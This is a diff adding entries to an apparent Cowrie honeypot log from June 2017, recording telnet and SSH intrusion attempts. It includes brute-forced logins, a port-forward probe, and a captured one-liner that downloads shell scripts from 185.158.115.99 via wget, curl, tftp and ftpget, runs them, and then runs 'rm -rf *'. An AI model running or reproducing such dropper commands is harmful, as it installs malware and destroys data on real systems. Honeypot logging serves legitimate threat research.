@@ -5204,3 +5204,54 @@
 2017-06-06T07:28:33+0000 [SSHChannel None (35) on SSHService 'ssh-connection' on HoneyPotSSHTransport,6945,91.230.47.81] direct-tcp forward to 188.214.134.10:28219 with data 'GET /ak/checkIp?geo=true HTTP/1.1\r\nConnection: close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nUser-Agent: Java/1.8.0_66\r\nHost: 188.214.134.10:28219\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n\r\n'
 2017-06-06T07:28:33+0000 [SSHChannel None (35) on SSHService 'ssh-connection' on HoneyPotSSHTransport,6945,91.230.47.81] failed to connect: Connection refused
 2017-06-06T07:28:33+0000 [SSHChannel None (35) on SSHService 'ssh-connection' on HoneyPotSSHTransport,6945,91.230.47.81] sending close 35
+2017-06-06T07:29:12+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 31.14.134.125:35349 (10.8.41.81:2223) [session: TT18709]
+2017-06-06T07:29:12+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 31.14.134.125:49604 (10.8.41.81:2223) [session: TT18710]
+2017-06-06T07:29:17+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 31.14.134.125:58836 (10.8.41.81:2223) [session: TT18711]
+2017-06-06T07:29:17+0000 [CowrieTelnetTransport,18709,31.14.134.125] login attempt: 614
+2017-06-06T07:29:17+0000 [CowrieTelnetTransport,18709,31.14.134.125] login return, expect: [root/54321]
+2017-06-06T07:29:19+0000 [CowrieTelnetTransport,18709,31.14.134.125] login attempt [root/54321] succeeded
+2017-06-06T07:29:22+0000 [CowrieTelnetTransport,18709,31.14.134.125] Opening TTY Log: log/tty/20170606-072922-None-18709i.log
+2017-06-06T07:29:22+0000 [CowrieTelnetTransport,18709,31.14.134.125] Warning: state changed and new state returned
+2017-06-06T07:29:22+0000 [CowrieTelnetTransport,18710,31.14.134.125] login attempt: 615
+2017-06-06T07:29:22+0000 [CowrieTelnetTransport,18710,31.14.134.125] login return, expect: [root/54321]
+2017-06-06T07:29:24+0000 [CowrieTelnetTransport,18710,31.14.134.125] login attempt [admin/5up] failed
+2017-06-06T07:29:24+0000 [CowrieTelnetTransport,18710,31.14.134.125] Warning: state changed and new state returned
+2017-06-06T07:29:24+0000 [CowrieTelnetTransport,18709,31.14.134.125] CMD: enable
+2017-06-06T07:29:24+0000 [CowrieTelnetTransport,18709,31.14.134.125] Command found: enable 
+2017-06-06T07:29:24+0000 [CowrieTelnetTransport,18709,31.14.134.125] Reading txtcmd from "txtcmds/bin/enable"
+2017-06-06T07:29:24+0000 [CowrieTelnetTransport,18709,31.14.134.125] CMD: shell
+2017-06-06T07:29:24+0000 [CowrieTelnetTransport,18709,31.14.134.125] Command not found: shell
+2017-06-06T07:29:24+0000 [CowrieTelnetTransport,18709,31.14.134.125] CMD: sh
+2017-06-06T07:29:24+0000 [CowrieTelnetTransport,18709,31.14.134.125] Command found: sh 
+2017-06-06T07:29:24+0000 [CowrieTelnetTransport,18709,31.14.134.125] CMD: cd /tmp; wget http://185.158.115.99/fyfa.sh; curl -O http://185.158.115.99/fyfa.sh; chmod 777 fyfa.sh; sh fyfa.sh; tftp 185.158.115.99 -c get tfyfa.sh; chmod 777 tfyfa.sh; sh tfyfa.sh; tftp -r tfyfa2.sh -g 185.158.115.99; chmod 777 tfyfa2.sh; sh tfyfa2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.158.115.99 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh; rm -rf *
+2017-06-06T07:29:24+0000 [CowrieTelnetTransport,18709,31.14.134.125] Command found: cd /tmp
+2017-06-06T07:29:24+0000 [CowrieTelnetTransport,18709,31.14.134.125] Command found: wget http://185.158.115.99/fyfa.sh
+2017-06-06T07:29:24+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.158.115.99/fyfa.sh>
+2017-06-06T07:29:24+0000 [HTTPPageDownloader,client] Not storing duplicate content 81ee3247e93af649c6c47556f0a4e2176160d100aa4257eba568bb3a85ceced7
+2017-06-06T07:29:24+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.158.115.99/fyfa.sh) with SHA-256 81ee3247e93af649c6c47556f0a4e2176160d100aa4257eba568bb3a85ceced7 to dl/81ee3247e93af649c6c47556f0a4e2176160d100aa4257eba568bb3a85ceced7
+2017-06-06T07:29:24+0000 [HTTPPageDownloader,client] Command found: curl -O http://185.158.115.99/fyfa.sh
+2017-06-06T07:29:24+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.158.115.99/fyfa.sh>
+2017-06-06T07:29:24+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.158.115.99/fyfa.sh>
+2017-06-06T07:29:24+0000 [CowrieTelnetTransport,18710,31.14.134.125] login attempt: 616
+2017-06-06T07:29:24+0000 [CowrieTelnetTransport,18710,31.14.134.125] login return, expect: [root/54321]
+2017-06-06T07:29:26+0000 [CowrieTelnetTransport,18710,31.14.134.125] login attempt [enable/shell] failed
+2017-06-06T07:29:26+0000 [CowrieTelnetTransport,18710,31.14.134.125] Warning: state changed and new state returned
+2017-06-06T07:29:27+0000 [CowrieTelnetTransport,18710,31.14.134.125] login attempt: 617
+2017-06-06T07:29:27+0000 [CowrieTelnetTransport,18710,31.14.134.125] login return, expect: [root/54321]
+2017-06-06T07:29:28+0000 [CowrieTelnetTransport,18710,31.14.134.125] login attempt [sh/cd /tmp; wget http://185.158.115.99/fyfa.sh; curl -O http://185.158.115.99/fyfa.sh; chmod 777 fyfa.sh; sh fyfa.sh; tftp 185.158.115.99 -c get tfyfa.sh; chmod 777 tfyfa.sh; sh tfyfa.sh; tftp -r tfyfa2.sh -g 185.158.115.99; chmod 777 tfyfa2.sh; sh tfyfa2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.158.115.99 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh; rm -rf *] failed
+2017-06-06T07:29:28+0000 [CowrieTelnetTransport,18710,31.14.134.125] Warning: state changed and new state returned
+2017-06-06T07:29:28+0000 [CowrieTelnetTransport,18709,31.14.134.125] QUEUED INPUT: /bin/busybox ECCHI
+2017-06-06T07:29:28+0000 [CowrieTelnetTransport,18711,31.14.134.125] Connection lost after 11 seconds
+2017-06-06T07:29:28+0000 [CowrieTelnetTransport,18710,31.14.134.125] Connection lost after 16 seconds
+2017-06-06T07:29:28+0000 [CowrieTelnetTransport,18709,31.14.134.125] Not storing duplicate content 81ee3247e93af649c6c47556f0a4e2176160d100aa4257eba568bb3a85ceced7
+2017-06-06T07:29:28+0000 [CowrieTelnetTransport,18709,31.14.134.125] Saved redir contents with SHA-256 81ee3247e93af649c6c47556f0a4e2176160d100aa4257eba568bb3a85ceced7 to dl/81ee3247e93af649c6c47556f0a4e2176160d100aa4257eba568bb3a85ceced7
+2017-06-06T07:29:28+0000 [CowrieTelnetTransport,18709,31.14.134.125] Closing TTY Log: log/tty/20170606-072922-None-18709i.log after 6 seconds
+2017-06-06T07:29:28+0000 [CowrieTelnetTransport,18709,31.14.134.125] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-06T07:29:28+0000 [CowrieTelnetTransport,18709,31.14.134.125] Connection lost after 16 seconds
+2017-06-06T07:29:28+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-06-06T07:29:28+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-06-06T07:29:28+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-06-06T07:29:28+0000 [HTTPPageDownloader,client] Not storing duplicate content 81ee3247e93af649c6c47556f0a4e2176160d100aa4257eba568bb3a85ceced7
+2017-06-06T07:29:28+0000 [HTTPPageDownloader,client] Connection was probably lost. Could not write to terminal
+2017-06-06T07:29:28+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.158.115.99/fyfa.sh>
